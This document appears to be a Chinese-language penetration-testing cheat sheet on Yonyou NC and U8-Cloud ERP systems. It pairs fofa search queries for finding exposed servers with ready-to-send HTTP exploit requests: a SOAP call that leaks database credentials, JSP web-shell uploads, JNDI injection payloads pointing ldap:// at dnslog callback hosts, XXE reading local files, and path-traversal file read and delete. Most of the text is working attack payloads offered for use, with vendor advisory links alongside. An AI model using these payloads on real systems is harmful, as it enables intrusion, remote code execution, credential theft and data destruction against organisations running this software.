推荐文章：

https://mp.weixin.qq.com/s/xVKuJb3DbKH0em0HoMZ4ZQ

https://mp.weixin.qq.com/s/5atb7S77bmmrhcDLgr5tgw

文件上传修复方案

https://pan.yonyou.com/s/xp0iHcpTc0 密码：ykft

## NC

fofa：app="用友-UFIDA-NC"

### 反序列化

#### 限制modules

##### NCMessageServlet

nc.message.bs.NCMessageServlet

modules\baseapp\META-INF\lib\baseapp_appmessageLevel-1.jar!\nc\message\bs\NCMessageServlet.class

```
/servlet/~baseapp/ncmsgservlet
/servlet/~baseapp/nc.message.bs.NCMessageServlet
```

https://stack.chaitin.com/vuldb/detail/591a76df-7c85-4ed7-8f63-5be7548b3bb3

##### JiuQiClientReqDispatch

com.ufsoft.iufo.jiuqi.JiuQiClientReqDispatch

modules\ufoe\lib\pubufoe_pub.jar!\com\ufsoft\iufo\jiuqi\JiuQiClientReqDispatch.class

```
/servlet/~ufoe/jiuqisingleservlet
/servlet/~ufoe/com.ufsoft.iufo.jiuqi.JiuQiClientReqDispatch
```

https://stack.chaitin.com/vuldb/detail/d844cc72-9959-4717-b111-48a44ebf9ebf

##### FileParserServlet

nc.search.file.parser.FileParserServlet

modules\uapss\META-INF\lib\uapss_fwsearchIILevel-1.jar!\nc\search\file\parser\FileParserServlet.class

```
/service/~uapss/nc.search.file.parser.FileParserServlet
```

##### FileUploadServlet

nc.file.pub.imple.FileUploadServlet

modules\baseapp\META-INF\lib\baseapp_appattachmanageLevel-1.jar\nc\file\pub\imple\FileUploadServlet.class

```
/servlet/FileUploadServlet
/servlet/~baseapp/nc.file.pub.imple.FileUploadServlet
```

##### DcUpdateRESTService

uap.bs.dc.server.DcUpdateRESTService

modules\uapbs\lib\pubuapbs_fsLevel-1.jar\uap\bs\dc\server\DcUpdateRESTService.class

```
/fs/dcupdateService/files
/service/~uapbs/files/../uap.bs.dc.server.DcUpdateRESTService
```

##### ECFileManageServlet

modules\ecapppub\META-INF\lib\ecapppub_ecpubapp.jar!\nc\impl\ecpubapp\filemanager\service\ECFileManageServlet.class

```
/servlet/ECFileManageServlet
/servlet/~ecapppub/nc.impl.ecpubapp.filemanager.service.ECFileManageServlet
```

##### OAContactsFuzzySearchServlet

modules\webbd\lib\pubwebbd_bdLevel-1.jar!\nc\uap\bs\im\servlet\OAContactsFuzzySearchServlet.class

```
/servlet/OAContactsFuzzySearchServlet
/servlet/~webbd/nc.uap.bs.im.servlet.OAContactsFuzzySearchServlet
```

##### LfwSsoRegisterServlet

nc.uap.portal.login.action.LfwSsoRegisterServlet

modules\websm\lib\pubwebsm_pserverLevel-1.jar!\nc\uap\portal\login\action\LfwSsoRegisterServlet.class

```
/servlet/~websm/nc.uap.portal.login.action.LfwSsoRegisterServlet
```

需要doPut等等操作

#### 不限制modules

> 下面是一些不限制modules的类，不管任何modules都可以触发

##### LoggingConfigServlet

nc.bs.logging.config.LoggingConfigServlet

external\lib\log.jar!\nc\bs\logging\config\LoggingConfigServlet.class

```
/service/~ic/nc.bs.logging.config.LoggingConfigServlet
/service/~aim/nc.bs.logging.config.LoggingConfigServlet
```

https://security.yonyou.com/#/noticeInfo?id=359

##### ConfigResourceServlet

nc.bs.framework.server.ConfigResourceServlet

\lib\fwserver.jar!\nc\bs\framework\server\ConfigResourceServlet.class

```
/servlet/~ic/nc.bs.framework.server.ConfigResourceServlet
```

https://security.yonyou.com/#/noticeInfo?id=218

##### ModelHandleServlet

uap.pub.ae.model.handle.ModelHandleServlet

modules\aert\lib\pubaert_serviceLevel-1.jar!\uap\pub\ae\model\handle\ModelHandleServlet.class

```
/servlet/~ic/uap.pub.ae.model.handle.ModelHandleServlet
```

##### ContactsQueryServiceServlet

modules\uapim\lib\pubuapim_impluginLevel-1.jar!\nc\bs\pub\im\ContactsQueryServiceServlet.class

```
/servlet/~ic/nc.bs.pub.im.ContactsQueryServiceServlet
/servlet/~ic/nc.bs.pub.im.ContactsFuzzySearchServlet
/servlet/~ic/nc.bs.pub.im.UserQueryServiceServlet
/servlet/~ic/nc.bs.pub.im.UserSynchronizationServlet
/servlet/~ic/nc.bs.pub.im.UserAuthenticationServlet
```

http://update.nsfocus.com/update/listBsaUtsDetail/v/rule2.0.1

##### ResourceManagerServlet

uap.framework.rc.controller.ResourceManagerServlet

lib\fwserver.jar!\uap\framework\rc\controller\ResourceManagerServlet.class

```
/servlet/~ic/uap.framework.rc.controller.ResourceManagerServlet
```



### 敏感信息泄露

#### portalsesInittoolservice信息泄漏漏洞

泄露数据库账号密码

```
POST /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
Content-Type: application/x-www-form-urlencoded

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:por="http://inittool.ses.itf.nc/PortalSESInitToolService">
 <soapenv:Header/>
 <soapenv:Body>
    <por:getDataSourceConfig/>
 </soapenv:Body>
</soapenv:Envelope>
```

https://stack.chaitin.com/vuldb/detail/e03d848e-28d7-405a-867f-1dbb02594c7d

#### wsncapplet.jsp信息泄漏

通过访问wsncapplet.jsp页面攻击者可以获取系统的关键信息，包括java版本、绝对路径等

```
jsp/wsncapplet.jsp
/ncws.jnlp
```

https://security.yonyou.com/#/noticeInfo?id=345

### NC65文件上传

#### grouptemplet文件上传漏洞

hotwebs\uapim\WEB-INF\lib\uapim-server-core-0.0.1.jar!\com\yonyou\uapim\web\controller\UploadController.class

```
POST /uapim/upload/grouptemplet?groupid=test HTTP/1.1
Host: 192.168.111.137:8082
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: */*
Cache-Control: no-cache
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=--------------------------166174900219260261099360
Content-Length: 227

----------------------------166174900219260261099360
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

123123
----------------------------166174900219260261099360--
```

上传路径：/uapim/static/pages/test/head.jsp

https://security.yonyou.com/#/noticeInfo?id=364

#### mp文件上传漏洞

hotwebs\mp\WEB-INF\lib\uap.mp.core-0.1.0.jar!\com\yonyou\uap\mp\controller\UploadFileServlet.class

```
POST /mp/login/../uploadControl/uploadFile HTTP/1.1
Host: 192.168.111.137:8082
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: */*
Cache-Control: no-cache
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=--------------------------166174900219260261099360
Content-Length: 227

----------------------------166174900219260261099360
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

123123
----------------------------166174900219260261099360--
```

上传路径：/mp/uploadFileDir/shell.jsp

https://security.yonyou.com/#/noticeInfo?id=342

#### accept.jsp任意文件上传漏洞

/aim/equipmap/accept.jsp

```
POST /aim/equipmap/accept.jsp HTTP/1.1
Host: 192.168.111.137:8082
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: */*
Cache-Control: no-cache
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=--------------------------166174900219260261099360
Content-Length: 346

----------------------------166174900219260261099360
Content-Disposition: form-data; name="fname"

webapps/nc_web/123.jsp
----------------------------166174900219260261099360
Content-Disposition: form-data; name="file"; filename="aaa"
Content-Type: application/octet-stream

test123
----------------------------166174900219260261099360--
```

上传路径：/123.jsp

https://security.yonyou.com/#/noticeInfo?id=281

### JNDI注入

#### IMsgCenterWebService

modules\uapmp\lib\pubuapmp_mpLevel-1.jar!\nc\itf\msgcenter\IMsgCenterWebService.class

打 modules\uapmp\META-INF\lib\uapmp_mpLevel-1.jar!\nc\impl\msgcenter\MsgCenterServiceImpl.class 的 uploadAttachment  方法

两种方式打

```
POST /uapws/service/nc.itf.msgcenter.IMsgCenterWebService HTTP/1.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: text/xml;charset=UTF-8
Host: 192.168.111.137:8082
Content-Length: 386

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ims="http://msgcenter.itf.nc/IMsgCenterWebService">
   <soapenv:Header/>
   <soapenv:Body>
      <ims:uploadAttachment>
         <dataSource>ldap://asdasd.u5rj53uh.dnslog.pw</dataSource>
      </ims:uploadAttachment>
   </soapenv:Body>
</soapenv:Envelope>
```

接口：hotwebs\uapws\WEB-INF\config.xml

可以通过 modules\uapfw\lib\pubuapfw_wsframeworkLevel-1.jar!\nc\uap\ws\console\action\SoapRequestAction.class 传参

```
POST /uapws/soapRequest.ajax HTTP/1.1
Host: 192.168.111.137:8082
Content-Length: 1046
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Origin: http://192.168.111.137:8082
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

ws=nc.itf.msgcenter.IMsgCenterWebService&soap=<?xml version="1.0" encoding="UTF-8"?><env:Envelop xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:sn="http://msgcenter.itf.nc/IMsgCenterWebService">
  <env:Header/>
  <env:Body>
    <sn:uploadAttachment>
      <dataSource>ldap://asdq3123.u5rj53uh.dnslog.pw</dataSource>
    </sn:uploadAttachment>
  </env:Body>
</env:Envelop>
```

具体文章：https://novysodope.github.io/2022/12/10/96/

#### registerServlet

接口：hotwebs/portal/WEB-INF/web.xml

```
/portal/registerServlet

type=1&dsname=ldap://asdasd.u5rj53uh.dnslog.pw
```

#### testper.jsp

```
/testper.jsp?dbname=ldap://123.1hz4ilnc.dnslog.pw
```

https://security.yonyou.com/#/noticeInfo?id=369



## U8-Cloud

fofa：app="用友-U8-Cloud"

### 反序列化

#### ServiceDispatcherServlet

接口：webapps/u8c_web/WEB-INF/web.xml

```
/ServiceDispatcherServlet
```

https://security.yonyou.com/#/noticeInfo?id=361

#### NCServiceForESBInvoker

modules\uapeai\META-INF\lib\uapeaipfxx.jar!\nc\bs\pfxx\NCServiceForESBInvoker.class

```
/service/ESBInvokerServlet
/service/~uapeai/nc.bs.pfxx.NCServiceForESBInvoker
```

https://security.yonyou.com/#/noticeInfo?id=254

#### FileTransportServlet

modules\iufo\lib\pubiufoiufoserver.jar!\nc\ui\iufo\server\center\FileTransportServlet.class

```
/service/~iufo/nc.ui.iufo.server.center.FileTransportServlet
```

GZIP压缩

### 任意文件读取

#### FileServlet

modules\hrpub\lib\pubhrpubtools.jar!\nc\bs\hr\tools\trans\FileServlet.class

就是base64编码

```
/servlet/nc.bs.hr.tools.trans.FileServlet?path=aWVycC9iaW4vcHJvcC54bWw=
```

https://security.yonyou.com/#/noticeInfo?id=252



### 任意文件删除

#### PrintTemplateFileServlet

modules\uapweb\lib\pubuapweb.jar!\nc\lfw\billtemplate\servlet\PrintTemplateFileServlet.class

读取文件并删除

```
/yer/xxxx.pdf?filePath=../../ierp/bin/prop.xml
```

#### delSPR.jsp

webapps/u8c_web/spr/delSPR.jsp

```
/spr/delSPR.jsp?sprName=../../../../../../../../
```



### XXE

#### SoapFormatAction

接口：hotwebs/uapws/WEB-INF/config.xml

modules\uapws\lib\pubwsframework.jar!\nc\uap\ws\console\action\SoapFormatAction.class

```
/uapws/soapFormat.ajax

msg=<%3fxml+version%3d"1.0"+encoding%3d"utf-8"%3f>
<!DOCTYPE+foo+[
<!ENTITY+xxe+SYSTEM+"file%3a///c%3a/windows/win.ini"+>]><a>%26xxe%3b</a>
```

https://security.yonyou.com/#/noticeInfo?id=284

### 任意文件上传

#### UploadImg2File

接口：hotwebs/hrss/WEB-INF/web.xml

modules\hrss\lib\pubhrssbusiness.jar!\nc\bs\hrss\hi\UploadImg2File.class

```
POST /hrss/servlet/uploadImg2File HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWMziTyR879iBoZhR
Content-Length: 561

------WebKitFormBoundaryWMziTyR879iBoZhR
Content-Disposition: form-data; name="txtFileName"; filename="21.jsp"
Content-Type: image/png

<%out.println("123");%>
------WebKitFormBoundaryWMziTyR879iBoZhR--
```

路径：/hrss/rm/../uploads/202309231201111695398471885.jsp

https://security.yonyou.com/#/noticeInfo?id=238

## NC-Cloud

fofa：app="用友-NC-Cloud"

